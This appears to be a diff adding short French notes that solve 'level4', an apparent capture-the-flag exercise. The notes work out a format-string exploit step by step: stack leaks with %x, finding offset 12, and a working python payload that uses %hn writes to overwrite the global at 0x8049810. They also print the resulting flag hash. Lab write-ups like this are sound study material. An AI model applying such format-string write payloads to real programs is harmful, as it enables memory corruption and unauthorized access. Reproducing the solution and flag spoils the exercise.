@@ -1,0 +1,24 @@
+Meme chose que l'exo precedent.
+
+	$ "./level4
+	AAAA %x %x %x %x %x %x %x %x %x %x %x %x"
+	AAAA b7ff26b0 bffff764 b7fd0ff4 0 0 bffff728 804848d bffff520 200 b7fd1ac0 b7ff37d0 41414141
+
+	$ /usr/bin/python -c 'print "AAAA" + "%12$p"' | ./level4
+	AAAA0x41414141
+
+	$ /usr/bin/python -c 'print "AAAABBBB" + "%12$hp%13$hp"' | ./level4
+	AAAABBBB0x414141410x42424242
+
+0x0804848d <+54>:    mov    0x8049810,%eax
+0x08048492 <+59>:    cmp    $0x1025544,%eax
+
+target: adress 0x8049810 <m>:  0x00000000
+write:	0x102 5544	16930116
+		258	21828
+
+0x8049810 + 2 = 0x8049812	\x12\x98\x04\x08	258 - 8 = 250
+0x8049810 + 0 = 0x8049810	\x10\x98\x04\x08	21828 - 258 = 21570"	
+	
+	$ /usr/bin/python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08" + "%250x%12$hn%21570x%13$hn"' | ./level4
+	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
